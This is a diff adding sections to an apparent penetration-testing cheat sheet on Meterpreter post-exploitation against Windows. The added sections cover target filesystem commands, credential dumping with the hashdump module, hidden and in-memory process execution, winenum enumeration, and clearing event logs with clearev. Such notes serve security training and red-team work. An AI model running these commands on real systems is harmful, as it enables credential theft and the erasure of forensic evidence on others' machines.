@@ -198,6 +198,17 @@ del /path/to/implant #remove implant artifact from disk
 
 * Now you are set up and running as a thread in the address space of the `svchost.exe` process
 
+### Accessing the Filesystem&#x20;
+
+* Common commands include&#x20;
+* **cd** - change directory on the target
+* **cat** - read and output to stdout the contents of a file
+* **del** - delete a file on the target
+* **edit** - edit a file with vim
+* **ls** - list files in current directory
+* **mkdir** - make a directory on the target system
+* **rmdir** - remove directory on the target system
+
 ### File collect with meterpreter
 
 * `download` and `upload` commands
@@ -206,6 +217,39 @@ del /path/to/implant #remove implant artifact from disk
 
 ```
 download C:\\Users\\Administrator\\Desktop\\secret.txt
+```
+
+### Harvest Credentials&#x20;
+
+* One way to try and harvest come credentials is with the hashdump module&#x20;
+
+```
+run post/windows/gather/hashdump
+```
+
+* The output of each line is in the following format: `Username:SID:LM hash:NTLM hash:::`
+* Note that the [LM](https://en.wikipedia.org/wiki/LAN\_Manager) hash `aad3b435b51404eeaad3b435b51404ee` corresponds to an empty password as well as the [NTLM](https://en.wikipedia.org/wiki/NT\_LAN\_Manager) hash `31d6cfe0d16ae931b73c59d7e0c089c0`.
+
+### Execute a program <a href="#executeaprogram" id="executeaprogram"></a>
+
+* The `execute` command allows us to start remote processes&#x20;
+* `execute` flags
+* **-H** Create the process hidden from view
+* **-a** Arguments to pass to the command
+* **-i** Interact with the process after creating it
+* **-m** Execute from memory
+* **-t** Execute process with currently impersonated thread token
+* **-s** Execute process in a given session as the session user
+* Regarding the last option `-s`, we can find out the available sessions by using the `enumdesktops`-command. The following example does that and then executes _calc.exe_ on session 1:
+
+```
+enumdesktops 
+Desktops
+--------
+    Session  Station Name
+    1        WinSta0 Default
+    1        WinSta0 Winlogon
+meterpreter> execute -s 1 -f calc.exe
 ```
 
 ### Post Modules for Windows Survey
@@ -239,6 +283,25 @@ msf > use post/multi/recon/local_exploit_suggester
 set SESSION X
 SHOWDESCRIPTION true
 -----------------------------------------------------------------------
+```
+
+### Winenum Windows Built In enumeration Script
+
+* from your meterpreter prompt:
+
+```
+meterpreter> run winenum
+```
+
+* This will use net, netsh, and wmic commands to enumerate the target machine.
+* Note: Each individual command in this script will have its output stored in the path output in the line starting with 'Output of each individual command is saved to '.
+
+### Clearing the Event Log
+
+* from a meterpreter prompt
+
+```
+meterpreter> clearev
 ```
 
 ### Meterpreter Extensions
